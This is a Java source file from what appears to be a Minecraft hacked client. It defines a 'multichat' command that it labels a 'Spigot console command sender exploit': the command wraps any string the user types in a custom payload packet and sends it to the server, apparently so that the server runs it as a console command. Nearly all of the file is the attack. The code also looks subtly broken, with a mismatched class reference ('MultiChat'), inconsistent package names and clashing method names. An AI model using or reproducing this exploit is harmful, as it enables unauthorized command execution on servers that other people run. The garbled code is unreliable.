package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.CommandSource;
import net.minecraft.Packet;
import net.minecraft.CustomPayloadC2SPacket;
import net.minecraft.MinecraftClient;
import net.minecraft.CustomPayload;
import io.github.spigotrce.paradiseclientprivate.writer.MultichatWriter;

public class Multichat extends Command {
    public Multichat(MinecraftClient minecraftClient) {
        super("multichat", "Spigot console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return (MultiChat.literal(this.getName()).executes(this::build)).then(MultiChat.argument("command", StringArgumentType.greedyString()).executes(context -> {
            Helper.sendPacket(new CustomPayloadC2SPacket(new MultichatWriter(context.getArgument("command", String.class))));
            Helper.printChatMessage("Payload sent!");
            return 1;
        }));
    }

    private int build(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
